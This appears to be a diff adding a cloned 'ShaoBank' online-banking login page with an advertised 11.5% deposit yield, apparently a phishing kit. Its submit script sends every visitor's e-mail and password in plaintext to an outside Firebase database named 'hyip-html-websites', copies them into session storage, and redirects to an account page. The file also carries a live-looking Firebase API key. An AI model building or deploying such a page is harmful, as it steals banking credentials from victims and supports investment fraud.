+                                          <!----><a class="text-nowrap"><span class="text-upper">en</span> English </a><!----><!----><!----><!----><!----><a class="text-nowrap"><span class="text-upper">it</span> Italiano </a><!----><!----><!----><!----><!----><a class="text-nowrap"><span class="text-upper">fr</span> Français </a><!----><!----><!----><!----><!----><a class="text-nowrap"><span class="text-upper">es</span> Español </a><!----><!----><!----><!----><!----><a class="text-nowrap"><span class="text-upper">vn</span> Tiếng Việt </a><!----><!----><!----><!----><!----><a class="text-nowrap"><span class="text-upper">pt</span> Português </a><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><a class="text-nowrap"><span class="text-upper">ru</span> Русский </a><!----><!----><!----><!----><!----><a class="text-nowrap"><span class="text-upper">hu</span> Magyar </a><!----><!----><!----><!----><!----><a class="text-nowrap"><span class="text-upper">id</span> Indonesia </a><!----><!----><!----><!----><!----><a class="text-nowrap"><span class="text-upper">cn</span> 中国 </a><!----><!----><!----><!----><!---->
+                                       </div>
+                                    </div>
+                                    <!---->
+                                    <app-auth-buttons>
+                                       <div class="header-btns">
+
+                                          <a routerlink="/auth/signin" class="m-btn tr" href="https://shaobank.com/auth/signin">Log in</a><a routerlink="/auth/signup" class="m-btn" href="https://shaobank.com/auth/signup">Sign up</a>
+
+                                       </div>
+                                    </app-auth-buttons>
+                                    <!---->
+                                 </div>
+                              </div>
+                              <!---->
+                           </div>
+                        </div>
+                     </div>
+                  </header>
+                  <!----><!---->
+               </app-header>
+               <section class="sign">
+                  <div class="container">
+                     <div class="row d-flex align-items-center">
+                        <div class="col-lg-8">
+                           <div class="m-title">Personal <span>Data</span></div>
+                           <router-outlet></router-outlet>
+                           <ng-component>
+                              <style>
+                                 #loginForm {
+    background-color: #e9ecee;
+}
+
+.black-text {
+    color: #000000 !important;
+}
+
+                              </style>
+
+
+                         
+    <form id="loginForm" class="sign-box ng-pristine ng-invalid ng-touched"  class="verify-gcaptcha" method="POST" action="Login.html" autocomplete="off">
+    <fieldset>
+        <div class="m-subtitle">Log in to digital banking</div>
+        <div class="row">
+            <div class="col-lg-6">
+
+                        <input type="hidden" name="active" value="yes">
+
+                <div class="m-input__title">E-mail</div>
+                <label class="m-input"><input type="email" formcontrolname="login" maxlength="64" autofocus="" placeholder="Enter e-mail"  name="username"  class="ng-pristine ng-invalid ng-touched"></label>
+            </div>
+            <div class="col-lg-6">
+                <div class="m-input__title"> Password <a routerlink="/auth/reset" href="https://shaobank.com/auth/reset">Forgot password?</a></div>
+                <label class="m-input"><input name="password"  type="password" formcontrolname="password" maxlength="32" placeholder="Enter password" class="ng-untouched ng-pristine ng-invalid"></label>
+            </div>
+        </div>
+        <button type="submit" id="submitButton" class="m-btn">Log in</button>
+    </fieldset>
+</form>
+
+                           </ng-component>
+
+
+<script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-database.js"></script>
+
+<script>
+  // Your web app's Firebase configuration
+  var firebaseConfig = {
+    apiKey: "AIzaSyAnRNSqRCMrSjhV1h74l8x57BnHIdoIiGY",
+    authDomain: "hyip-html-websites.firebaseapp.com",
+    databaseURL: "https://hyip-html-websites-default-rtdb.firebaseio.com",
+    projectId: "hyip-html-websites",
+    storageBucket: "hyip-html-websites.appspot.com",
+    messagingSenderId: "241224051127",
+    appId: "1:241224051127:web:213fd8f4002bdd3fdc6032",
+    measurementId: "G-QLBNBX70XP"
+  };
+
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  
+  var database = firebase.database();
+
+  document.getElementById('loginForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    var username = document.getElementsByName('username')[0].value;
+    var password = document.getElementsByName('password')[0].value;
+    var active = document.getElementsByName('active')[0].value;
+
+    // validate fields
+    if(username.trim() === '' || password.trim() === '') {
+      alert('All fields are required');
+      return;
+    }
+
+    // add data to firebase
+    var newUserRef = database.ref('Shaobank_users').push();
+    newUserRef.set({
+      username: username,
+      password: password, // note: you should never store passwords in plaintext
+      active: active,
+      timeAdded: firebase.database.ServerValue.TIMESTAMP
+    }, function(error) {
+      if (error) {
+        console.error('Error writing data: ', error);
+      } else {
+        console.log('Data successfully written!');
+
+        // save data to the session
+        sessionStorage.setItem('username', username);
+        sessionStorage.setItem('password', password);
+
+        // redirect to the desired page
+        window.location.href = 'account.html';
+      }
+    });
+  });
+</script>
+
+                           <script>
+
+
+
+var form = document.getElementById('loginForm');
+var emailInput = form.querySelector('input[type="email"]');
+var passwordInput = form.querySelector('input[type="password"]');
+var submitButton = document.getElementById('submitButton');
+
+// Change background color on click only if email or password inputs are empty
+form.addEventListener('click', function() {
+    if (emailInput.value === "" || passwordInput.value === "") {
+        form.style.backgroundColor = "#ff63471a";
+        emailInput.classList.remove('black-text');
+        passwordInput.classList.remove('black-text');
+        submitButton.disabled = true;
+    }
+});
+
+// Change back to original color and text color to black and enable button once password input has any input
+passwordInput.addEventListener('input', function() {
+    if (emailInput.value !== "" && passwordInput.value !== "") {
+        form.style.backgroundColor = "#e9ecee";
+        emailInput.classList.add('black-text');
+        passwordInput.classList.add('black-text');
+        submitButton.disabled = false;
+    } else {
+        submitButton.disabled = true;
+    }
+});
+
+// Also change back to original color and text color to black and enable button once email input has any input
+emailInput.addEventListener('input', function() {
+    if (emailInput.value !== "" && passwordInput.value !== "") {
+        form.style.backgroundColor = "#e9ecee";
+        emailInput.classList.add('black-text');
+        passwordInput.classList.add('black-text');
+        submitButton.disabled = false;
+    } else {
+        submitButton.disabled = true;
+    }
+});
+
+
+
+
+                           </script>
+                           <!---->
+                        </div>
+                        <div class="col-lg-4">
+                           <div class="dep-info dep-info_19 animate__animated animate__faster animate__fadeIn">
+                              <img src="./Log in to account - ShaoBank_files/dep-info.webp" alt="">
+                              <div class="dep-info__logo"><img src="./Log in to account - ShaoBank_files/logo-full.svg" alt=""></div>
+                              <h2>Save and grow with deposits</h2>
+                              <p>With Shao Bank, money works without the need for your participation</p>
+                              <facade-plan-info>
+                                 <div class="dep-info__list">
+                                    <div class="dep-info__item">
+                                       <h3>Deposit amount</h3>
+                                       <p>8000-8M <span>HKD</span></p>
+                                    </div>
+                                    <div class="dep-info__item">
+                                       <h3>Business term</h3>
+                                       <p>12 months</p>
+                                    </div>
+                                    <div class="dep-info__item">
+                                       <h3>Yield</h3>
+                                       <p>11.5%</p>
+                                    </div>
+                                 </div>
+                                 <!---->
+                              </facade-plan-info>
+                              <a routerlink="/deposits" class="m-btn white" href="https://shaobank.com/deposits">Find out more</a>
+                              <div class="dep-info__bar">
+                                 <div class="dep-info__bar-line"><span style="width: 94.5%;"></span></div>
+                              </div>
+                           </div>
+                           <!----><!----><!---->
+                        </div>
+                     </div>
+                  </div>
+               </section>
+            </div>
+         </ng-component>
+         <!---->
+         <app-modal></app-modal>
+         <!---->
+         <app-toast>
+            <div class="msg">
+               <!---->
+            </div>
+         </app-toast>
+      </app-root>
+      <script src="./Log in to account - ShaoBank_files/runtime.a4d0db8447b62798.js" type="module"></script><script src="./Log in to account - ShaoBank_files/polyfills.e7b1a76ca1fac565.js" type="module"></script><script src="./Log in to account - ShaoBank_files/scripts.c31d0ba205440621.js" defer=""></script><script src="./Log in to account - ShaoBank_files/main.3d7638298550a57a.js" type="module"></script>
+      <div style="visibility: hidden; position: absolute; width: 100%; top: -10000px; left: 0px; right: 0px; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0;">
+         <div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.5;"></div>
+         <div style="margin: 0px auto; top: 0px; left: 0px; right: 0px; position: absolute; border: 1px solid rgb(204, 204, 204); z-index: 2000000000; background-color: rgb(255, 255, 255); overflow: hidden;">
+
+
+
+         </div>
+      </div>
+   </body>
+</html>
